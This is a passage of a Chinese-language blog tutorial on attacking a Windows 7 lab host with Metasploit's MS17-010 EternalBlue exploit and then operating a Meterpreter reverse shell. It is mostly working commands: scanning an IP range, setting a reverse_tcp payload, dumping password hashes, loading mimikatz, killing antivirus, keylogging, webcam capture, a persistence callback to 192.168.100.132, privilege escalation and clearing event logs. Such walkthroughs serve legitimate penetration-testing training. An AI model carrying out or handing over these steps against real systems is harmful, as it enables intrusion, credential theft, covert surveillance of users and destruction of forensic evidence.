#后渗透阶段<br></code></pre></td></tr></table></figure><p>不同的攻击用到的步骤也不一样，这不是一成不变的，需要灵活使用。 我们也可以将攻击代码写入configure.rc（只要是以.rc结尾的文件）配置文件中，然后使用命令msfconsole -r configure.rc进行自动攻击！</p><h2 id="2-MS17-010-永恒之蓝-："><a href="#2-MS17-010-永恒之蓝-：" class="headerlink" title="2.MS17_010(永恒之蓝)："></a>2.MS17_010(永恒之蓝)：</h2><p>我们现在模拟使用 MS17_010 漏洞攻击，这个漏洞就是去年危害全球的勒索病毒利用的永恒之蓝漏洞</p><h2 id="3-Meterpreter"><a href="#3-Meterpreter" class="headerlink" title="3.Meterpreter"></a>3.Meterpreter</h2><p>Meterpreter属于stage payload，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“<code>内存DLL注入</code>”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件</p><p><strong>Meterpreter是如何工作的？</strong></p><p>首先目标先要执行初始的<code>溢出漏洞</code>会话连接，可能是 bind正向连接，或者反弹 reverse 连接。反射连接的时候<code>加载dll</code>链接文件，同时后台悄悄处理 dll 文件。其次Meterpreter核心代码初始化,通过 socket套接字建立一个TLS&#x2F;1.0加密隧道并发送GET请求给Metasploit服务端。Metasploit服务端收到这个GET请求后就配置相应客户端。最后，Meterpreter加载扩展，所有的扩展被加载都通过TLS&#x2F;1.0进行数据传输。</p><p><strong>Meterpreter的特点</strong></p><ul><li><code>Meterpreter</code>完全驻留在<code>内存</code>，没有写入到磁盘。</li><li><code>Meterpreter</code>注入的时候不会产生新的进程，并可以很容易的移植到其它正在运行的进程。</li><li>默认情况下， <code>Meterpreter</code>的通信是加密的，所以很安全。</li><li>扩展性，许多新的特征模块可以被加载。<br>我们在设置<code>payloads</code> 时，可以将<code>payloads</code>设置为：<code>windows/meterpreter/reverse_tcp</code> ，然后获得了<code>meterpreter&gt;</code>之后我们就可以干很多事了！具体做的事，在我们下面的后渗透阶段都有讲！</li></ul><p>　查找漏洞相关模块：</p><p>1、在kali命令行里面输入命令msfconsole，进入msf框架中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">msfconsole  #输入这个命令主要是进入msf渗透框架中<br></code></pre></td></tr></table></figure><p>2、搜索MS17_010漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">search ms17_010  #利用search命令，搜索漏洞相关利用模块<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fedde8018ba19f745a919b866829f201.png" alt="image-20250408151333706"></p><h2 id="4-Auxiliary辅助探测模块"><a href="#4-Auxiliary辅助探测模块" class="headerlink" title="4.Auxiliary辅助探测模块"></a>4.Auxiliary辅助探测模块</h2><p>利用Auxiliary辅助探测模块对漏洞进行探测：</p><p><code>Auxiliary辅助探测模块</code>：<br>该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p><p>1、使用smb_ms17_010漏洞探测模块对smb_ms17_010漏洞进行探测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">use auxiliary/scanner/smb/smb_ms17_010<br></code></pre></td></tr></table></figure><p>2、查看这个模块需要配置的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show options<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/586356148ea4c397b6d9dfd2bd4915d6.png" alt="image-20250408155017277"></p><p>3、设置要探测的远程目标：</p><p>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> rhost 10.0.0.1-10.0.0.254<br></code></pre></td></tr></table></figure><p>4、对上面设置的ip范围内的主机进行攻击：<br>注：有+号的就是可能存在漏洞的主机，这里有2个主机存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a983bc4d0562bc4f92fb8b0e33dc5924.png" alt="image-20250408160119885"></p><h2 id="5-Exploit漏洞利用模块"><a href="#5-Exploit漏洞利用模块" class="headerlink" title="5.Exploit漏洞利用模块"></a>5.Exploit漏洞利用模块</h2><p>使用<code>Exploit漏洞利用模块</code>对漏洞进行利用：</p><p>1、选择漏洞攻击模块，对漏洞进行利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">use exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure><p>2、查看这个漏洞的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">info<br></code></pre></td></tr></table></figure><p>3、查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show targets  <br></code></pre></td></tr></table></figure><p>真好靶机就是Windows7</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/28d51a3c872d2e156fb1dbf8a9349a85.png" alt="image-20250408160928288"></p><h2 id="6-Payload攻击载荷模块："><a href="#6-Payload攻击载荷模块：" class="headerlink" title="6.Payload攻击载荷模块："></a>6.Payload攻击载荷模块：</h2><p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p><p>1、查看攻击载荷：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show payloads      #该命令可以查看当前漏洞利用模块下可用的所有Payload<br></code></pre></td></tr></table></figure><p>2、设置攻击载荷：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">set payload windows/x64/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>关于reverse_ tcp与bind _tcp</p><ul><li>采用reverse的方法一般较为安全， 因为<code>是目标机主动连接攻击机</code>，所以一般不会被防火墙发现。</li><li>而采用bind的方法，<code>攻击机主动连接目标机</code>( 即需要在目标机上打开端口)时很容易被安全软件和防火墙发现。</li></ul><p>3、查看模块需要配置的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">show options<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2aa96c8ba70c92a409210836faf49ced.png" alt="image-20250408161454008"></p><p>4、设置攻击载荷参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">set RHOST 10.0.0.129   #设置RHOST，也就是要攻击主机的ip<br>set LHOST 10.0.0.128   #设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell<br>set lport 6666   #设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；<br></code></pre></td></tr></table></figure><h2 id="7-后渗透阶段："><a href="#7-后渗透阶段：" class="headerlink" title="7.后渗透阶段："></a>7.后渗透阶段：</h2><p>运行了<code>exploit命令</code>之后，我们开启了一个<code>reverse TCP监听器</code>来监听本地的<code>6666</code>端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/6f51c1905bc99ecaf6dbaca7f1b1d3b5.png" alt="image-20250408161658071"></p><p>　Meterpreter的命令用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs bash">Meterpreter &gt; ?<br>==========================================<br>核心命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>?                             帮助菜单<br>background                    把当前会话挂到后台运行<br><span class="hljs-built_in">bg</span>                            background命令的别名<br>bgkill                        杀死后台meterpreter 脚本<br>bglist                        列出正在运行的后台脚本<br>bgrun                         执行一个meterpreter脚本作为后台线程<br>channel                       显示信息或控制活动频道<br>close                         关闭一个频道<br>detach                        分离Meterpreter会话（用于 http/https）<br>disable_unicode_encoding      禁用 unicode 字符串的编码<br>enable_unicode_encoding       启用 unicode 字符串的编码<br><span class="hljs-built_in">exit</span>                          终止 Meterpreter 会话<br>get_timeouts                  获取当前会话超时值<br>guid                          获取会话 GUID<br><span class="hljs-built_in">help</span>                          帮助菜单<br>info                          显示有关 Post 模块的信息<br>irb                           在当前会话中打开一个交互式 Ruby shell<br>load                          加载一个或多个 Meterpreter 扩展<br>machine_id                    获取连接到会话的机器的 MSF ID<br>migrate                       将服务器迁移到另一个进程<br>pivot                         管理枢轴侦听器<br>pry                           在当前会话上打开 Pry 调试器<br>quit                          终止 Meterpreter 会话<br><span class="hljs-built_in">read</span>                          从通道读取数据<br>resource                      运行存储在文件中的命令<br>run                           执行一个 Meterpreter 脚本或 Post 模块<br>secure                       （重新）协商会话上的 TLV 数据包加密<br>sessions                      快速切换到另一个会话<br>set_timeouts                  设置当前会话超时值<br><span class="hljs-built_in">sleep</span>                         强制 Meterpreter 安静，然后重新建立会话<br>ssl_verify                    修改 SSL 证书验证设置<br>transport                     管理运输机制<br>use                           不推荐使用的load命令别名<br>uuid                          获取当前会话的 UUID<br>write                         将数据写入通道<br><br>==========================================<br>Stdapi：文件系统命令<br>==========================================<br><br>命令                           说明<br>-------                       ------------<br><span class="hljs-built_in">cat</span>                           将文件内容读到屏幕上<br><span class="hljs-built_in">cd</span>                            切换目录<br>checksum                      检索文件的校验和<br><span class="hljs-built_in">cp</span>                            将源复制到目标<br>del                           删除指定文件<br><span class="hljs-built_in">dir</span>                           列出文件（<span class="hljs-built_in">ls</span> 的别名）<br>download                      下载文件或目录<br>edit                          编辑文件<br>getlwd                        打印本地工作目录<br>getwd                         打印工作目录<br>lcd                           更改本地工作目录<br>lls                           列出本地文件<br>lpwd                          打印本地工作目录<br><span class="hljs-built_in">ls</span>                            列出文件<br><span class="hljs-built_in">mkdir</span>                         制作目录<br><span class="hljs-built_in">mv</span>                            将源移动到目标<br><span class="hljs-built_in">pwd</span>                           打印工作目录<br><span class="hljs-built_in">rm</span>                            删除指定文件<br><span class="hljs-built_in">rmdir</span>                         删除目录<br>search                        搜索文件<br>show_mount                    列出所有挂载点/逻辑驱动器<br>upload                        上传文件或目录<br><br>==========================================<br>Stdapi：网络命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>arp                           显示主机 ARP 缓存<br>getproxy                      显示当前代理配置<br>ifconfig                      显示界面<br>ipconfig                      显示接口<br>netstat                       显示网络连接<br>portfwd                       将本地端口转发到远程服务<br>resolve                       解析目标上的一组主机名<br>route                         查看和修改路由表<br><br>==========================================<br>Stdapi：系统命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>clearev                       清除事件日志<br>drop_token                    放弃任何活动的模拟令牌。<br>execute                       执行命令<br>getenv                        获取一个或多个环境变量值<br>getpid                        获取当前进程标识符<br>getprivs                      尝试启用当前进程可用的所有权限<br>getid                         获取服务器运行的用户的 SID<br>getuid                        获取服务器运行的用户<br><span class="hljs-built_in">kill</span>                          终止进程<br>localtime                     显示目标系统本地日期和时间<br>pgrep                         按名称过滤进程<br>pkill                         按名称终止进程<br>ps                            列出正在运行的进程<br>reboot                        重启远程计算机<br>reg                           修改远程注册表并与之交互<br>rev2self                      在远程机器上调用 RevertToSelf()<br>shell                         放入系统命令 shell<br>shutdown                      关闭远程计算机<br>steal_token                   尝试从目标进程窃取模拟令牌<br><span class="hljs-built_in">suspend</span>                       暂停或恢复进程列表<br>sysinfo                       获取有关远程系统的信息，例如 OS<br><br>==========================================<br>Stdapi：用户界面命令<br>==========================================<br>命令                           说明<br>-------                       ------------<br>enumdesktops                  列出所有可访问的桌面和窗口站<br>getdesktop                    获取当前的meterpreter桌面<br>idletime                      返回远程用户空闲的秒数<br>keyboard_send                 发送击键<br>keyevent                      发送按键事件<br>keyscan_dump                  转储击键缓冲区<br>keyscan_start                 开始捕获击键<br>keyscan_stop                  停止捕获击键<br>mouse                         发送鼠标事件<br>screenshare                   实时观看远程用户桌面<br>screenshot                    抓取交互式桌面的截图<br>setdesktop                    更改meterpreters当前桌面<br>uictl                         控制一些用户界面组件<br><br>==========================================<br>Stdapi：网络摄像头命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>record_mic                    从默认麦克风录制音频 X 秒<br>webcam_chat                   开始视频聊天<br>webcam_list                   列出网络摄像头<br>webcam_snap                   从指定的网络摄像头拍摄快照<br>webcam_stream                 从指定的网络摄像头播放视频流<br><br>==========================================<br>Stdapi：音频输出命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>play                          在目标系统上播放波形音频文件 (.wav)<br><br>==========================================<br>Priv：权限提升命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>getsystem                     尝试将您的权限提升到本地系统的权限。<br><br>==========================================<br>Priv：密码数据库命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>hashdump                      转储 SAM 数据库的内容<br><br>==========================================<br>Priv：Timestomp 命令：<br>==========================================<br>命令                           说明<br>-------                       ------------<br>timestomp                     操作文件 MACE 属性<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure><p>常用的Meterpreter命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">sysinfo             #查看目标主机系统信息<br>run scraper         #查看目标主机详细信息<br>run hashdump        #导出密码的哈希<br>load kiwi           #加载mimikatz<br>ps                  #查看目标主机进程信息<br>pwd                 #查看目标当前目录(windows)<br>getlwd              #查看目标当前目录(Linux)<br>search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下<br>upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下<br>getpid             #查看当前Meterpreter Shell的进程PID<br>migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>idletime            #查看主机运行时间<br>getuid              #查看获取的当前权限<br>getsystem           #提权,获得的当前用户是administrator才能成功<br>run  killav         #关闭杀毒软件<br>screenshot          #截图<br>webcam_list         #查看目标主机的摄像头<br>webcam_snap         #拍照<br>webcam_stream       #开视频<br>execute 参数 -f 可执行文件       #执行可执行程序<br>run getgui -u test1 -p Abc123456    #创建test1用户，密码为Abc123456<br>run getgui -e                #开启远程桌面<br>keyscan_start                #开启键盘记录功能<br>keyscan_dump                 #显示捕捉到的键盘记录信息<br>keyscan_stop                 #停止键盘记录功能<br>uictl  disable  keyboard     #禁止目标使用键盘<br>uictl  enable   keyboard     #允许目标使用键盘<br>uictl  disable  mouse        #禁止目标使用鼠标<br>uictl  enable   mouse        #允许目标使用鼠标<br>load                        #使用扩展库<br>run             #使用扩展库<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span> <br>run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        <br><span class="hljs-meta prompt_">#</span><span class="language-bash">将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span><br>portfwd add -l 9999 -r 192.168.100.158 -p 3389     <br>clearev                                                 #清除日志<br></code></pre></td></tr></table></figure><p>我们输入： shell即可切换到目标主机的windows cmd_shell里面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell         <span class="hljs-comment">#获取目标主机的cmd_shell权限</span><br>chcp 65001    <span class="hljs-comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span><br></code></pre></td></tr></table></figure><p>要想从目标主机shell退出到<code>meterpreter</code> ，我们只需输入：<code>exit</code></p><p>从meterpreter退出到MSF框架:  我们只需输入：background </p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/bb12c581aa08acf64bf261d62518748f.png" alt="image-20250408162805517"></p><p>查看前面获得的<code>meterpreter_shell</code>会话，最前面的数字是会话的id：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions  -l<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/33b7a7363d7ed55e6738611e83815dba.png" alt="image-20250408162851667"></p><p>输入sessions [id号]即可进入相应的<code>meterpreter_shell</code>中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sessions 3<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e52adff932b6f19d7c4a2466d537ce9a.png" alt="image-20250408162947189"></p><h3 id="7-1-Post-后渗透模块"><a href="#7-1-Post-后渗透模块" class="headerlink" title="7.1 Post 后渗透模块"></a><strong>7.1 Post 后渗透模块</strong></h3><p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/manage/migrate                #自动进程迁移<br>run post/windows/gather/checkvm                #查看目标主机是否运行在虚拟机上<br>run post/windows/manage/killav                #关闭杀毒软件<br>run post/windows/manage/enable_rdp            #开启远程桌面服务<br>run post/windows/manage/autoroute              #查看路由信息<br>run post/windows/gather/enum_logged_on_users    #列举当前登录的用户<br>run post/windows/gather/enum_applications       #列举应用程序<br>run post/windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br>run post/windows/gather/smart_hashdump               #dump出所有用户的hash<br></code></pre></td></tr></table></figure><p>输入：sysinfo 查看目标主机的信息:</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a31f9015408fc38a60689da439e65257.png" alt="image-20250408163406636"></p><h3 id="7-2-查看主机是否运行在虚拟机上"><a href="#7-2-查看主机是否运行在虚拟机上" class="headerlink" title="7.2 查看主机是否运行在虚拟机上:"></a><strong>7.2 查看主机是否运行在虚拟机上:</strong></h3><p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/gather/checkvm<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4fc8a9acb2f04bbe52d3d42846e6534d.png" alt="image-20250408163511981"></p><h3 id="7-3-关闭杀毒软件："><a href="#7-3-关闭杀毒软件：" class="headerlink" title="7.3 关闭杀毒软件："></a><strong>7.3 关闭杀毒软件：</strong></h3><p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/manage/killav<br></code></pre></td></tr></table></figure><h3 id="7-4-获取目标主机的详细信息："><a href="#7-4-获取目标主机的详细信息：" class="headerlink" title="7.4 获取目标主机的详细信息："></a><strong>7.4 获取目标主机的详细信息：</strong></h3><p>它将目标机器上的常见信息收集起来然后下载保存在本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run scraper <br></code></pre></td></tr></table></figure><h3 id="7-5-访问文件系统："><a href="#7-5-访问文件系统：" class="headerlink" title="7.5 访问文件系统："></a><strong>7.5 访问文件系统：</strong></h3><p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span>     <span class="hljs-comment">#查看当前目录</span><br><span class="hljs-built_in">cd</span>      <span class="hljs-comment">#切换目标目录；</span><br><span class="hljs-built_in">cat</span>     <span class="hljs-comment">#读取文件内容；</span><br><span class="hljs-built_in">rm</span>      <span class="hljs-comment">#删除文件；</span><br>edit    <span class="hljs-comment">#使用vim编辑文件</span><br><span class="hljs-built_in">ls</span>      <span class="hljs-comment">#获取当前目录下的文件；</span><br><span class="hljs-built_in">mkdir</span>   <span class="hljs-comment">#新建目录；</span><br><span class="hljs-built_in">rmdir</span>   <span class="hljs-comment">#删除目录； </span><br></code></pre></td></tr></table></figure><h3 id="7-6-上传-下载文件："><a href="#7-6-上传-下载文件：" class="headerlink" title="7.6 上传&#x2F;下载文件："></a><strong>7.6 上传&#x2F;下载文件：</strong></h3><p>下载文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">download  file<br></code></pre></td></tr></table></figure><p>上传文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">upload  file <br></code></pre></td></tr></table></figure><h3 id="7-7-权限提升："><a href="#7-7-权限提升：" class="headerlink" title="7.7 权限提升："></a><strong>7.7 权限提升：</strong></h3><p>有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">#自动提权为系统权限<br>getsystem<br>#命令可以获取当前用户的信息，可以看到，当我们使用 getsystem进行提权后，用户权限为  NT AUTHORITY\SYSTEM ，这个也就是Windows的系统权限。<br>getuid<br></code></pre></td></tr></table></figure><p>注：执行getsystem命令后，会显示错误，但是其实已经运行成功了！</p><h3 id="7-8-获取用户密码"><a href="#7-8-获取用户密码" class="headerlink" title="7.8 获取用户密码"></a><strong>7.8 获取用户密码</strong></h3><p>参考链接：<a href="https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501">https://blog.csdn.net/weixin_45588247/article/details/119519411?spm=1001.2014.3001.5501</a></p><h3 id="7-9-运行程序："><a href="#7-9-运行程序：" class="headerlink" title="7.9 运行程序："></a><strong>7.9 运行程序：</strong></h3><p>先查看目标主机安装了哪些应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">run post/windows/gather/enum_applications <br></code></pre></td></tr></table></figure><p>在meterpreter_shell命令行执行目标系统中的应用程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apl">#execute命令用法：<br>execute [参数] -f 指定的可执行文件<br><br>-f：指定可执行文件<br>-H：创建一个隐藏进程<br>-a：传递给命令的参数<br>-i：跟进程进行交互<br>-m：从内存中执行<br>-t：使用当前伪造的线程令牌运行进程<br>-s：在给定会话中执行进程<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b5ecd34eccb69e76f2bc91ed33f9428d.png" alt="image-20250408165109773"></p><h3 id="7-11-屏幕截图"><a href="#7-11-屏幕截图" class="headerlink" title="7.11 屏幕截图"></a><strong>7.11 屏幕截图</strong></h3><p>1、截图目标主机屏幕，可以看到，图片被保存到了<code>/root/桌面/</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">screenshot           <span class="hljs-comment">#截图目标主机屏幕</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ead1c61688e3eaad5304cf609f84ce54.png" 